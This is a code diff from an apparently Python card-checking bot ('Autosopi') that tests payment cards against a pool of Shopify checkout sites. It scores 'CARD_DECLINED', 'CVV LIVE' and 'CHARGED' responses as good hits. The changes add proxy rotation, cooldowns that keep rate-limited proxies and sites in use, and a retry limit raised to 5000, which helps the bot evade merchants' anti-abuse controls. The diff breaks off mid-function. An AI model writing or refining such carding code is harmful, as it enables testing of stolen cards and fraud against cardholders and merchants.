@@ -1924,27 +1924,31 @@ AUTOSOPI_RETRY_CONFIG = {
 
 class AutosopiProxyTracker:
     """
-    Track proxy performance - ONLY removes on 407 after 3 failures
-    429 and Throttled get cooldown periods instead of removal
+    Track proxy performance.
+    - 407 errors: track, remove after 3 consecutive failures
+    - 429 / Throttled: put on 30-second cooldown (DO NOT REMOVE)
+    - Success: reset error counters
     """
-    
+
     def __init__(self):
-        self.working_proxies = {}  # user_id -> list of working proxies
-        self.proxy_performance = {}  # proxy -> stats
-        self.proxy_rotation_index = {}  # user_id -> current index
-        self.proxy_cooldown = {}  # proxy -> cooldown_until timestamp
-        
-        # Track errors per proxy
-        self.proxy_errors = {}  # proxy -> {'407': 0, '429': 0, 'throttled': 0, 'last_error': '', 'total': 0}
-        self.MAX_407_ERRORS = 3  # Remove after 3 consecutive 407 errors
-        
+        self.working_proxies = {}        # user_id -> list of working proxies
+        self.proxy_performance = {}      # proxy -> stats
+        self.proxy_rotation_index = {}   # user_id -> current index
+        self.proxy_cooldown = {}         # proxy -> cooldown_until timestamp
+        self.proxy_errors = {}           # proxy -> {'407': 0, '429': 0, 'throttled': 0, 'total': 0, 'last_error': '', 'last_time': 0}
+
+        self.MAX_407_ERRORS = 3
+        self.RATE_LIMIT_COOLDOWN = 30    # 30-second cooldown for 429 / throttled
+
+    # ---------------------------------------------------------------
+    #  RESPONSE VALIDATION
+    # ---------------------------------------------------------------
     def is_valid_response(self, response_text: str) -> bool:
-        """Check if response indicates proxy is working (card errors = working)"""
         if not response_text:
             return False
-            
+
         response_upper = response_text.upper()
-        
+
         valid_patterns = [
             "CARD_DECLINED", "DECLINED", "OTP_REQUIRED", "3D REQUIRED",
             "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "CVV LIVE",
@@ -1954,7 +1958,7 @@ class AutosopiProxyTracker:
             "NO_SESSION_TOKEN", "RISK_DISALLOWED",
             "EXISTING_ACCOUNT_RESTRICTED", "SITE DEAD"
         ]
-        
+
         invalid_patterns = [
             "PROXY DEAD", "CONNECTION ERROR", "TIMEOUT",
             "INVALID PROXY", "PROXY AUTHENTICATION FAILED",
@@ -1962,236 +1966,226 @@ class AutosopiProxyTracker:
             "COULD NOT RESOLVE PROXY", "CURL: (5)", "CURL: (6)",
             "CURL: (7)", "EMPTY_RESPONSE"
         ]
-        
-        if any(pattern in response_upper for pattern in valid_patterns):
+
+        if any(p in response_upper for p in valid_patterns):
             return True
-        
-        if any(pattern in response_upper for pattern in invalid_patterns):
+        if any(p in response_upper for p in invalid_patterns):
             return False
-        
         return bool(response_text) and len(response_text) > 10
-    
+
+    # ---------------------------------------------------------------
+    #  COOLDOWN HELPERS
+    # ---------------------------------------------------------------
     def is_proxy_on_cooldown(self, proxy: str) -> bool:
-        """Check if proxy is currently on cooldown"""
+        """Check if a proxy is currently on 429 cooldown."""
+        if not proxy:
+            return False
         if proxy in self.proxy_cooldown:
             if time.time() < self.proxy_cooldown[proxy]:
+                remaining = int(self.proxy_cooldown[proxy] - time.time())
+                print(f"⏸️ [Proxy Cooldown] {mask_proxy(proxy)} — {remaining}s remaining")
                 return True
             else:
-                # Cooldown expired
                 del self.proxy_cooldown[proxy]
         return False
-    
-    def add_cooldown(self, proxy: str, seconds: int):
-        """Add proxy to cooldown"""
+
+    def mark_rate_limited(self, user_id: int, proxy: str, seconds: int = 30):
+        """Put a proxy on cooldown for 429 / throttled (DO NOT REMOVE)."""
+        if not proxy:
+            return
         self.proxy_cooldown[proxy] = time.time() + seconds
-        print(f"⏸️ [Proxy Cooldown] {mask_proxy(proxy)} on cooldown for {seconds}s")
-    
+        # Ensure it stays in the working pool so it can be reused after cooldown
+        if user_id not in self.working_proxies:
+            self.working_proxies[user_id] = []
+        if proxy not in self.working_proxies[user_id]:
+            self.working_proxies[user_id].append(proxy)
+        print(f"⏸️ [429 Cooldown] {mask_proxy(proxy)} on cooldown for {seconds}s (NOT removed)")
+
+    # ---------------------------------------------------------------
+    #  PROXY RESULT RECORDING
+    # ---------------------------------------------------------------
     async def record_proxy_result(self, user_id: int, proxy: str, response_text: str, response_time: float):
         """
-        Record proxy result with smart error handling
-        - 407: Track errors, remove after 3 failures
-        - 429: Add 60s cooldown, DO NOT REMOVE
-        - Throttled: Add 30s cooldown, DO NOT REMOVE
-        - Success: Reset error count
+        Record proxy result.
+        - 407: track errors, remove after 3 failures
+        - 429: add 30s cooldown, DO NOT REMOVE
+        - Throttled: add 30s cooldown, DO NOT REMOVE
+        - Success: reset error count
         """
         if not proxy:
             return
-        
-        is_407 = "407" in response_text or "Proxy Authentication" in response_text
-        is_429 = "429" in response_text or "Rate limit" in response_text or "RATE_LIMIT" in response_text
+
+        is_407 = ("407" in response_text) or ("Proxy Authentication" in response_text)
+        is_429 = ("429" in response_text) or ("Rate limit" in response_text) or ("RATE_LIMIT" in response_text)
         is_throttled = "Throttled" in response_text
         is_success = self.is_valid_response(response_text)
-        
-        # Initialize error tracking for this proxy
+
+        # --- init error tracking ---
         if proxy not in self.proxy_errors:
             self.proxy_errors[proxy] = {
-                '407': 0,
-                '429': 0,
-                'throttled': 0,
-                'total': 0,
-                'last_error': '',
-                'last_time': 0
+                '407': 0, '429': 0, 'throttled': 0,
+                'total': 0, 'last_error': '', 'last_time': 0
             }
-        
-        # Initialize performance tracking
+
+        # --- init performance tracking ---
         if proxy not in self.proxy_performance:
             self.proxy_performance[proxy] = {
-                'success_count': 0,
-                'fail_count': 0,
-                'total_checks': 0,
-                'avg_response_time': 0,
-                'last_response': response_text[:100],
-                'last_used': 0,
-                'is_working': True
+                'success_count': 0, 'fail_count': 0, 'total_checks': 0,
+                'avg_response_time': 0, 'last_response': response_text[:100],
+                'last_used': 0, 'is_working': True
             }
-        
+
         stats = self.proxy_performance[proxy]
         stats['total_checks'] += 1
-        stats['avg_response_time'] = ((stats['avg_response_time'] * (stats['total_checks'] - 1)) + response_time) / stats['total_checks']
+        stats['avg_response_time'] = (
+            (stats['avg_response_time'] * (stats['total_checks'] - 1)) + response_time
+        ) / stats['total_checks']
         stats['last_response'] = response_text[:100]
         stats['last_used'] = time.time()
-        
-        error_stats = self.proxy_errors[proxy]
-        
-        # ============ HANDLE 407 ============
+
+        err = self.proxy_errors[proxy]
+
+        # ============ 407 ============
         if is_407:
-            error_stats['407'] += 1
-            error_stats['total'] += 1
-            error_stats['last_error'] = '407'
-            error_stats['last_time'] = time.time()
-            
-            print(f"⚠️ [Proxy] {mask_proxy(proxy)} got 407 (#{error_stats['407']}/{self.MAX_407_ERRORS})")
-            
-            # Remove after 3 consecutive 407 errors
-            if error_stats['407'] >= self.MAX_407_ERRORS:
+            err['407'] += 1
+            err['total'] += 1
+            err['last_error'] = '407'
+            err['last_time'] = time.time()
+            print(f"⚠️ [Proxy] {mask_proxy(proxy)} got 407 (#{err['407']}/{self.MAX_407_ERRORS})")
+
+            if err['407'] >= self.MAX_407_ERRORS:
                 print(f"🗑️ [Proxy] {mask_proxy(proxy)} REMOVED after {self.MAX_407_ERRORS} 407 errors")
-                if user_id in self.working_proxies:
-                    if proxy in self.working_proxies[user_id]:
-                        self.working_proxies[user_id].remove(proxy)
-                # Clean up tracking
-                if proxy in self.proxy_errors:
-                    del self.proxy_errors[proxy]
+                if user_id in self.working_proxies and proxy in self.working_proxies[user_id]:
+                    self.working_proxies[user_id].remove(proxy)
+                self.proxy_errors.pop(proxy, None)
                 if proxy in self.proxy_performance:
                     self.proxy_performance[proxy]['is_working'] = False
             return
-        
-        # ============ HANDLE 429 (RATE LIMIT) - DO NOT REMOVE ============
+
+        # ============ 429 (cooldown, NO REMOVAL) ============
         if is_429:
-            error_stats['429'] += 1
-            error_stats['last_error'] = '429'
-            error_stats['last_time'] = time.time()
-            
-            # Add 60 second cooldown - DO NOT REMOVE
-            self.add_cooldown(proxy, 60)
-            print(f"⏸️ [429] {mask_proxy(proxy)} rate limited - cooldown 60s (NOT removed)")
-            
-            # Mark as working (just on cooldown)
-            if user_id not in self.working_proxies:
-                self.working_proxies[user_id] = []
-            if proxy not in self.working_proxies[user_id]:
-                self.working_proxies[user_id].append(proxy)
+            err['429'] += 1
+            err['last_error'] = '429'
+            err['last_time'] = time.time()
+            self.mark_rate_limited(user_id, proxy, self.RATE_LIMIT_COOLDOWN)
+            print(f"⏸️ [429] {mask_proxy(proxy)} rate limited — cooldown {self.RATE_LIMIT_COOLDOWN}s (NOT removed)")
             return
-        
-        # ============ HANDLE THROTTLED - DO NOT REMOVE ============
+
+        # ============ Throttled (cooldown, NO REMOVAL) ============
         if is_throttled:
-            error_stats['throttled'] += 1
-            error_stats['last_error'] = 'throttled'
-            error_stats['last_time'] = time.time()
-            
-            # Add 30 second cooldown - DO NOT REMOVE
-            self.add_cooldown(proxy, 30)
-            print(f"⏸️ [Throttled] {mask_proxy(proxy)} throttled - cooldown 30s (NOT removed)")
-            
-            # Mark as working (just on cooldown)
-            if user_id not in self.working_proxies:
-                self.working_proxies[user_id] = []
-            if proxy not in self.working_proxies[user_id]:
-                self.working_proxies[user_id].append(proxy)
+            err['throttled'] += 1
+            err['last_error'] = 'throttled'
+            err['last_time'] = time.time()
+            self.mark_rate_limited(user_id, proxy, self.RATE_LIMIT_COOLDOWN)
+            print(f"⏸️ [Throttled] {mask_proxy(proxy)} throttled — cooldown {self.RATE_LIMIT_COOLDOWN}s (NOT removed)")
             return
-        
-        # ============ SUCCESS ============
+
+        # ============ Success ============
         if is_success:
-            # Reset errors on success
-            if proxy in self.proxy_errors:
-                self.proxy_errors[proxy] = {'407': 0, '429': 0, 'throttled': 0, 'total': 0, 'last_error': '', 'last_time': 0}
-            
+            err['407'] = 0
+            err['429'] = 0
+            err['throttled'] = 0
+            err['total'] = 0
+            err['last_error'] = ''
             stats['success_count'] += 1
             stats['is_working'] = True
-            
-            # Add to working proxies if not already
+
             if user_id not in self.working_proxies:
                 self.working_proxies[user_id] = []
             if proxy not in self.working_proxies[user_id]:
                 self.working_proxies[user_id].append(proxy)
                 print(f"✅ [Proxy] {mask_proxy(proxy)} added to working pool")
             return
-        
-        # ============ OTHER ERRORS ============
-        # Any other error - track but don't remove immediately
-        error_stats['total'] += 1
-        error_stats['last_error'] = response_text[:50]
-        error_stats['last_time'] = time.time()
+
+        # ============ Other errors ============
+        err['total'] += 1
+        err['last_error'] = response_text[:50]
+        err['last_time'] = time.time()
         stats['fail_count'] += 1
-        
-        # Only remove after 5 other errors
-        if error_stats['total'] >= 5:
+
+        if err['total'] >= 5:
             print(f"🗑️ [Proxy] {mask_proxy(proxy)} removed after 5 errors")
-            if user_id in self.working_proxies:
-                if proxy in self.working_proxies[user_id]:
-                    self.working_proxies[user_id].remove(proxy)
-            if proxy in self.proxy_errors:
-                del self.proxy_errors[proxy]
-    
+            if user_id in self.working_proxies and proxy in self.working_proxies[user_id]:
+                self.working_proxies[user_id].remove(proxy)
+            self.proxy_errors.pop(proxy, None)
+
+    # ---------------------------------------------------------------
+    #  PROXY SELECTION (skips cooldown proxies)
+    # ---------------------------------------------------------------
     def get_working_proxy(self, user_id: int, exclude_proxy: str = None) -> Optional[str]:
-        """Get a working proxy, skipping cooldown proxies"""
+        """Get a working proxy, skipping proxies on 429 cooldown."""
         if user_id not in self.working_proxies or not self.working_proxies[user_id]:
             return None
-        
-        now = time.time()
-        
-        # Filter out proxies on cooldown
+
+        # Filter out cooldown proxies and excluded proxy
         available = []
         for proxy in self.working_proxies[user_id]:
             if proxy == exclude_proxy:
                 continue
             if self.is_proxy_on_cooldown(proxy):
-                print(f"⏸️ [Proxy] Skipping {mask_proxy(proxy)} (on cooldown)")
                 continue
             available.append(proxy)
-        
+
         if not available:
-            # All proxies on cooldown - wait a bit
-            print(f"⏸️ [Proxy] All proxies on cooldown, waiting...")
+            # All proxies on cooldown — pick the one with shortest remaining cooldown
+            remaining = []
+            for proxy in self.working_proxies[user_id]:
+                if proxy in self.proxy_cooldown:
+                    left = self.proxy_cooldown[proxy] - time.time()
+                    if left > 0:
+                        remaining.append((proxy, left))
+            if remaining:
+                remaining.sort(key=lambda x: x[1])
+                best = remaining[0][0]
+                print(f"⏸️ [Proxy] All on cooldown — using shortest ({int(remaining[0][1])}s): {mask_proxy(best)}")
+                return best
             return None
-        
-        # Sort by performance (best first)
-        def get_score(proxy):
-            perf = self.proxy_performance.get(proxy, {})
-            success_count = perf.get('success_count', 0)
-            total = perf.get('total_checks', 1)
-            success_rate = success_count / total if total > 0 else 0
-            avg_time = perf.get('avg_response_time', 10)
-            score = success_rate * (10 / max(avg_time, 0.5))
-            
-            # Penalize proxies that had recent errors
-            error_stats = self.proxy_errors.get(proxy, {})
-            if error_stats.get('429', 0) > 0:
-                score *= 0.8
-            if error_stats.get('throttled', 0) > 0:
-                score *= 0.9
-            
-            return score
-        
-        available.sort(key=get_score, reverse=True)
-        
-        # Rotate through proxies
+
+        # Rank by performance score
+        def score(p):
+            perf = self.proxy_performance.get(p, {})
+            sc = perf.get('success_count', 0)
+            tc = perf.get('total_checks', 1)
+            rate = sc / tc if tc > 0 else 0
+            avg = perf.get('avg_response_time', 10)
+            s = rate * (10 / max(avg, 0.5))
+            e = self.proxy_errors.get(p, {})
+            if e.get('429', 0) > 0:
+                s *= 0.8
+            if e.get('throttled', 0) > 0:
+                s *= 0.9
+            return s
+
+        available.sort(key=score, reverse=True)
         if user_id not in self.proxy_rotation_index:
             self.proxy_rotation_index[user_id] = 0
-        
         idx = self.proxy_rotation_index[user_id] % len(available)
         selected = available[idx]
         self.proxy_rotation_index[user_id] = idx + 1
-        
-        # Update last used
+
         if selected in self.proxy_performance:
             self.proxy_performance[selected]['last_used'] = time.time()
-        
         return selected
-    
+
+    # ---------------------------------------------------------------
+    #  CLEANUP
+    # ---------------------------------------------------------------
     def clear_user_proxies(self, user_id: int):
-        """Clear all proxies for a user"""
         if user_id in self.working_proxies:
             self.working_proxies[user_id] = []
         if user_id in self.proxy_rotation_index:
             del self.proxy_rotation_index[user_id]
-        
-        # Clean up proxy-specific tracking
         for proxy in list(self.proxy_errors.keys()):
-            self.proxy_errors[proxy] = {'407': 0, '429': 0, 'throttled': 0, 'total': 0, 'last_error': '', 'last_time': 0}
-        
+            self.proxy_errors[proxy] = {
+                '407': 0, '429': 0, 'throttled': 0,
+                'total': 0, 'last_error': '', 'last_time': 0
+            }
         print(f"🗑️ Cleared proxy cache for user {user_id}")
+
+
 # Create global instance
 autosopi_proxy_tracker = AutosopiProxyTracker()
+
 
 # ============ BROADCAST SYSTEM ============
 BROADCAST_FILE = "broadcast.json"
@@ -12567,15 +12561,13 @@ SHOPIFY_API_POOL = [
 
 class ShopifyAPIPool:
     """
-    Rotates between multiple Shopify APIs to distribute load
-    Supports weighted round-robin and automatic failover
-    RETRY UNTIL ALL SITES ARE EXHAUSTED (no hard limit)
-    PROXY ROTATION on retry to avoid rate limiting
-    GOOD sites (CARD_DECLINED/OTP_REQUIRED) are prioritized for next cards
-    429 errors are tracked - sites with 20+ 429 errors are removed
-    APIs are NEVER disabled - all APIs remain active
+    Rotates between multiple Shopify APIs.
+    - GOOD sites are prioritised
+    - 429 errors → 30s cooldown on the SITE (never removed unless 20× 429)
+    - 429 errors → 30s cooldown on the PROXY (never removed)
+    - Other site errors are logged but don't remove the site
     """
-    
+
     def __init__(self, apis=None):
         if apis is None:
             apis = SHOPIFY_API_POOL
@@ -12586,15 +12578,20 @@ class ShopifyAPIPool:
         self._lock = asyncio.Lock()
         self.session = None
         self.retried_cards = set()
-        
-        # ============ SITE PERFORMANCE TRACKING ============
+
+        # Site performance tracking
         self.site_performance = {}
         self.good_sites_cache = []
         self.good_sites_cache_time = 0
         self.good_sites_cache_ttl = 60
-        
+
+        # ============ 429 SITE COOLDOWN ============
+        self.site_cooldown = {}          # site -> cooldown_until timestamp
+        self.SITE_429_COOLDOWN = 30      # 30-second cooldown
+        self.SITE_429_REMOVAL_THRESHOLD = 20  # only remove after 20× 429
+
         self._load_site_performance()
-        
+
         for api in self.apis:
             api["enabled"] = True
             self.api_stats[api["name"]] = {
@@ -12608,13 +12605,16 @@ class ShopifyAPIPool:
                 "enabled": True,
                 "weight": api.get("weight", 1)
             }
-        
-        print(f"🔌 Shopify API Pool initialized with {len(self.apis)} APIs (ALL ENABLED - NEVER DISABLE)")
+
+        print(f"🔌 Shopify API Pool initialised with {len(self.apis)} APIs (ALL ENABLED)")
         for api in self.apis:
             print(f"   • {api['name']}: {api['url']} (weight: {api.get('weight', 1)})")
         print(f"📊 Loaded performance data for {len(self.site_performance)} sites")
-        print(f"🔄 Site rotation: GOOD sites first, then normal sites, pure round-robin")
-    
+        print(f"⏸️ 429 site cooldown: {self.SITE_429_COOLDOWN}s (removal after {self.SITE_429_REMOVAL_THRESHOLD}×429)")
+
+    # ---------------------------------------------------------------
+    #  PERSISTENCE
+    # ---------------------------------------------------------------
     def _load_site_performance(self):
         try:
             if Path('site_performance.json').exists():
@@ -12627,18 +12627,41 @@ class ShopifyAPIPool:
         except Exception as e:
             print(f"⚠️ Error loading site performance: {e}")
             self.site_performance = {}
-    
+
     def _save_site_performance(self):
         try:
-            data = {
-                'sites': self.site_performance,
-                'timestamp': time.time()
-            }
+            data = {'sites': self.site_performance, 'timestamp': time.time()}
             with open('site_performance.json', 'w') as f:
                 json.dump(data, f, indent=2)
         except Exception as e:
             print(f"⚠️ Error saving site performance: {e}")
-    
+
+    # ---------------------------------------------------------------
+    #  SITE COOLDOWN HELPERS
+    # ---------------------------------------------------------------
+    def is_site_on_cooldown(self, site: str) -> bool:
+        """Check if a site is on 429 cooldown."""
+        if not site:
+            return False
+        if site in self.site_cooldown:
+            if time.time() < self.site_cooldown[site]:
+                remaining = int(self.site_cooldown[site] - time.time())
+                print(f"⏸️ [Site Cooldown] {site} — {remaining}s remaining")
+                return True
+            else:
+                del self.site_cooldown[site]
+        return False
+
+    def mark_site_rate_limited(self, site: str, seconds: int = 30):
+        """Put a site on cooldown for 429 (DO NOT REMOVE)."""
+        if not site:
+            return
+        self.site_cooldown[site] = time.time() + seconds
+        print(f"⏸️ [429 Cooldown] Site {site} on cooldown for {seconds}s (NOT removed)")
+
+    # ---------------------------------------------------------------
+    #  SITE PERFORMANCE TRACKING
+    # ---------------------------------------------------------------
     def _update_site_performance(self, site: str, response_text: str, is_good: bool = False, is_rate_limit: bool = False):
         if site not in self.site_performance:
             self.site_performance[site] = {
@@ -12649,80 +12672,102 @@ class ShopifyAPIPool:
                 'last_time': 0,
                 'is_good': False
             }
-        
+
         stats = self.site_performance[site]
         stats['total_checks'] += 1
         stats['last_response'] = response_text[:100]
         stats['last_time'] = time.time()
-        
+
         if is_good:
             stats['good_responses'] += 1
             stats['is_good'] = True
             self.good_sites_cache_time = 0
             print(f"🌟 [SITE TRACKING] Good response for {site} (total good: {stats['good_responses']})")
-        
+
         if is_rate_limit:
             stats['rate_limits'] += 1
             print(f"🚫 [SITE TRACKING] Rate limit #{stats['rate_limits']} for {site}")
-            
-            if stats['rate_limits'] >= 20:
-                print(f"🗑️ [SITE REMOVAL] Site {site} removed due to 20+ rate limits (429 errors)")
+
+            # ============ 30-SECOND COOLDOWN INSTEAD OF REMOVAL ============
+            self.mark_site_rate_limited(site, self.SITE_429_COOLDOWN)
+            # ==============================================================
+
+            # Only remove after threshold (20×)
+            if stats['rate_limits'] >= self.SITE_429_REMOVAL_THRESHOLD:
+                print(f"🗑️ [SITE REMOVAL] {site} removed — {self.SITE_429_REMOVAL_THRESHOLD}+ 429 errors")
                 autosopi_site_manager.remove_site(site, OWNER_ID)
-                if site in self.site_performance:
-                    del self.site_performance[site]
+                self.site_performance.pop(site, None)
+                self.site_cooldown.pop(site, None)
                 self.good_sites_cache_time = 0
-        
+
         if stats['total_checks'] % 50 == 0:
             self._save_site_performance()
-    
+
+    # ---------------------------------------------------------------
+    #  GOOD SITE SELECTION (skips cooldown sites)
+    # ---------------------------------------------------------------
     def _get_good_sites_prioritized(self) -> list:
         if self.good_sites_cache and (time.time() - self.good_sites_cache_time) < self.good_sites_cache_ttl:
             return self.good_sites_cache
-        
+
         good_sites = []
         for site, stats in self.site_performance.items():
             if stats.get('is_good', False) and stats.get('good_responses', 0) > 0:
-                if site in autosopi_site_manager.sites:
-                    good_sites.append({
-                        'site': site,
-                        'score': stats.get('good_responses', 0) * 10 - stats.get('total_checks', 0) * 0.5,
-                        'good_count': stats.get('good_responses', 0),
-                        'total_checks': stats.get('total_checks', 0),
-                        'last_time': stats.get('last_time', 0)
-                    })
-        
+                if site not in autosopi_site_manager.sites:
+                    continue
+                # Skip sites currently on 429 cooldown
+                if self.is_site_on_cooldown(site):
+                    continue
+                good_sites.append({
+                    'site': site,
+                    'score': stats.get('good_responses', 0) * 10 - stats.get('total_checks', 0) * 0.5,
+                    'good_count': stats.get('good_responses', 0),
+                    'total_checks': stats.get('total_checks', 0),
+                    'last_time': stats.get('last_time', 0)
+                })
+
         good_sites.sort(key=lambda x: (-x['good_count'], x['total_checks'], -x['last_time']))
         self.good_sites_cache = [s['site'] for s in good_sites]
         self.good_sites_cache_time = time.time()
-        
-        if len(self.good_sites_cache) > 0:
-            print(f"📊 [SITE PRIORITY] Found {len(self.good_sites_cache)} good sites")
+
+        if self.good_sites_cache:
+            print(f"📊 [SITE PRIORITY] Found {len(self.good_sites_cache)} good sites (non-cooldown)")
             if len(self.good_sites_cache) > 5:
-                print(f"   Top sites: {self.good_sites_cache[:5]}")
-        
+                print(f"   Top: {self.good_sites_cache[:5]}")
         return self.good_sites_cache
-    
+
     def _get_next_site_from_manager(self, tried_sites: list = None) -> Optional[str]:
+        """Get next site, skipping any on 429 cooldown."""
         if tried_sites is None:
             tried_sites = []
-        
-        site = site_rotation_manager.get_next_site()
-        
-        if site and site in tried_sites:
-            print(f"⚠️ [Site Rotation] Site {site} already tried, getting next...")
-            site_rotation_manager.get_next_site()
+
+        attempts = 0
+        site = None
+        while attempts < 20:
             site = site_rotation_manager.get_next_site()
-        
+            if not site:
+                break
+            if self.is_site_on_cooldown(site):
+                print(f"⏸️ Skipping {site} (429 cooldown), trying next...")
+                attempts += 1
+                continue
+            if site in tried_sites:
+                attempts += 1
+                continue
+            break
+
         if site:
-            good_sites = site_rotation_manager._get_good_sites()
-            if site in good_sites:
+            good = site_rotation_manager._get_good_sites()
+            if site in good:
                 price = site_quality_tracker.get_site_price(site)
-                print(f"🌟 [SITE SELECTION] Using prioritized GOOD site: {site} (${price:.2f})")
+                print(f"🌟 [SITE SELECTION] Using GOOD site: {site} (${price:.2f})")
             else:
                 print(f"📌 [SITE SELECTION] Using normal site: {site}")
-        
         return site
-    
+
+    # ---------------------------------------------------------------
+    #  SESSION / API SELECTION
+    # ---------------------------------------------------------------
     async def get_session(self):
         if self.session is None:
             timeout = httpx.Timeout(60.0, connect=15.0, read=50.0)
@@ -12733,21 +12778,20 @@ class ShopifyAPIPool:
                 http2=True
             )
         return self.session
-    
+
     async def get_next_api(self) -> dict:
-        """Get next enabled API using weighted round-robin - ONLY ENABLED APIS"""
         async with self._lock:
             enabled_apis = [api for api in self.apis if api.get("enabled", True)]
             if not enabled_apis:
                 print("⚠️ No Shopify APIs enabled! Re-enabling all...")
                 for api in self.apis:
                     api["enabled"] = True
-                    enabled_apis = self.apis.copy()
-                    
+                enabled_apis = self.apis.copy()
+
             total_weight = sum(api.get("weight", 1) for api in enabled_apis)
             rand = random.uniform(0, total_weight)
             cumulative = 0
-            
+
             for api in enabled_apis:
                 cumulative += api.get("weight", 1)
                 if rand <= cumulative:
@@ -12755,14 +12799,13 @@ class ShopifyAPIPool:
                     break
             else:
                 selected = enabled_apis[0]
+
             self.last_used[selected["name"]] = time.time()
-            
             stats = self.api_stats.get(selected["name"], {})
-            success_rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
-            print(f"🔄 [API POOL] Selected: {selected['name']} ✅ (weight: {selected.get('weight', 1)}, success: {success_rate:.0f}%)")
-            
+            rate = (stats.get('successful', 0) / max(stats.get('total_requests', 1), 1)) * 100
+            print(f"🔄 [API POOL] Selected: {selected['name']} ✅ (weight: {selected.get('weight', 1)}, success: {rate:.0f}%)")
             return selected.copy()
-    
+
     def mark_api_result(self, api_name: str, success: bool, response_time: float, is_retryable: bool = False, is_rate_limit: bool = False):
         for api in self.apis:
             if api["name"] == api_name:
@@ -12773,13 +12816,13 @@ class ShopifyAPIPool:
                 else:
                     api["fail_count"] = api.get("fail_count", 0) + 1
                     api["weight"] = max(0.5, api.get("weight", 1) - 0.5)
-                
-                old_avg = api.get("avg_response_time", 0)
-                total_calls = api.get("success_count", 0) + api.get("fail_count", 0)
-                if total_calls > 0:
-                    api["avg_response_time"] = ((old_avg * (total_calls - 1)) + response_time) / total_calls
+
+                old = api.get("avg_response_time", 0)
+                total = api.get("success_count", 0) + api.get("fail_count", 0)
+                if total > 0:
+                    api["avg_response_time"] = ((old * (total - 1)) + response_time) / total
                 break
-        
+
         if api_name in self.api_stats:
             self.api_stats[api_name]["total_requests"] += 1
             if success:
@@ -12791,214 +12834,184 @@ class ShopifyAPIPool:
                     self.api_stats[api_name]["rate_limited"] += 1
                 else:
                     self.api_stats[api_name]["failed"] += 1
-            
-            old_avg = self.api_stats[api_name]["avg_response_time"]
+
+            old = self.api_stats[api_name]["avg_response_time"]
             total = self.api_stats[api_name]["total_requests"]
             if total > 0:
-                self.api_stats[api_name]["avg_response_time"] = ((old_avg * (total - 1)) + response_time) / total
-    
+                self.api_stats[api_name]["avg_response_time"] = ((old * (total - 1)) + response_time) / total
+
+    # ---------------------------------------------------------------
+    #  HELPERS
+    # ---------------------------------------------------------------
     def _get_card_key(self, card: str, site: str) -> str:
         return f"{card}|{site}"
-    
+
     def _is_good_response(self, response_text: str) -> bool:
-        response_upper = response_text.upper()
-        good_indicators = [
+        u = response_text.upper()
+        good = [
             "CARD_DECLINED", "OTP_REQUIRED", "ORDER_PLACED", "3D REQUIRED",
             "OTP", "3D", "CVV LIVE", "INSUFFICIENT FUNDS",
-            "ORDER_PLACED", "CHARGED", "ORDER COMPLETED",
+            "ORDER COMPLETED", "CHARGED",
             "INSUFFICIENT_FUNDS", "INSUFFICIENT", "FUNDS"
         ]
-        return any(indicator in response_upper for indicator in good_indicators)
-    
+        return any(g in u for g in good)
+
+    # ---------------------------------------------------------------
+    #  MAIN CARD CHECK (skips cooldown sites & proxies)
+    # ---------------------------------------------------------------
     async def check_card_with_pool(self, card: str, site: str, proxy: str = None, user_id: int = None) -> Dict:
-        """
-        Check a card using the best available API from the pool.
-        PROXY ROTATION FIX: Each attempt gets a DIFFERENT proxy from the user's pool.
-        """
         tried_sites = []
         tried_proxies = []
         attempt = 0
-        max_attempts = 50
-        
-        # ============ GET FULL LIST OF PROXIES FOR THIS USER ============
+        max_attempts = 5000
+
+        # Collect proxies for this user
         user_proxies = []
         if user_id:
-            # Try autosopi_proxy_tracker first
             if user_id in autosopi_proxy_tracker.working_proxies:
                 user_proxies = autosopi_proxy_tracker.working_proxies.get(user_id, [])
-                print(f"🔌 [PROXY ROTATION] Found {len(user_proxies)} proxies from tracker for user {user_id}")
-            
-            # Fallback to proxy_manager
+                print(f"🔌 [PROXY ROTATION] Found {len(user_proxies)} proxies (tracker)")
             if not user_proxies and user_id in proxy_manager.user_proxies:
                 user_proxies = proxy_manager.user_proxies.get(user_id, [])
-                print(f"🔌 [PROXY ROTATION] Found {len(user_proxies)} proxies from manager for user {user_id}")
-            
-            # Also check global proxy pool
+                print(f"🔌 [PROXY ROTATION] Found {len(user_proxies)} proxies (manager)")
             if not user_proxies and global_proxy_pool.enabled and global_proxy_pool.proxies:
                 user_proxies = global_proxy_pool.proxies.copy()
                 print(f"🌐 [PROXY ROTATION] Using {len(user_proxies)} global proxies")
-        
-        # If a specific proxy was passed, add it to the list
+
         if proxy and proxy not in user_proxies:
             user_proxies.append(proxy)
-            print(f"🔌 [PROXY ROTATION] Added passed proxy to list")
-        
-        # Initialize with the provided site if any
+
         if site:
             tried_sites.append(site)
-            print(f"📍 Initial site: {site}")
-        
-        # Store the last used proxy index for rotation
+
         if not hasattr(self, '_proxy_index'):
             self._proxy_index = {}
-        
         if user_id not in self._proxy_index:
             self._proxy_index[user_id] = 0
-        
+
         while attempt < max_attempts:
             attempt += 1
-            
-            # ============ GET SITE USING ROTATION MANAGER ============
+
+            # ---------- SITE SELECTION ----------
             if attempt == 1 and site:
                 current_site = site
             else:
-                current_site = site_rotation_manager.get_next_site()
-                
+                current_site = self._get_next_site_from_manager(tried_sites)
                 if not current_site:
                     print(f"❌ [API POOL] No more sites available after {attempt} attempts")
                     break
-                
+
+            # Ensure it's not on cooldown
+            if self.is_site_on_cooldown(current_site):
+                print(f"⏸️ [API POOL] Skipping {current_site} (429 cooldown)")
+                if current_site in tried_sites:
+                    tried_sites.remove(current_site)
+                continue
+
             tried_sites.append(current_site)
-            
-            # ============ GET PROXY WITH ROTATION ============
+
+            # ---------- PROXY SELECTION ----------
             current_proxy = None
-            
             if user_proxies:
-                # Get a proxy that hasn't been tried yet
-                available_proxies = [p for p in user_proxies if p not in tried_proxies]
-                
-                if available_proxies:
-                    # Use round-robin index
-                    idx = self._proxy_index.get(user_id, 0) % len(available_proxies)
-                    current_proxy = available_proxies[idx]
+                available = [p for p in user_proxies if p not in tried_proxies]
+                if not available:
+                    tried_proxies = []
+                    available = [p for p in user_proxies if not autosopi_proxy_tracker.is_proxy_on_cooldown(p)]
+
+                if available:
+                    # prefer non-cooldown proxies
+                    non_cd = [p for p in available if not autosopi_proxy_tracker.is_proxy_on_cooldown(p)]
+                    pool = non_cd if non_cd else available
+                    idx = self._proxy_index.get(user_id, 0) % len(pool)
+                    current_proxy = pool[idx]
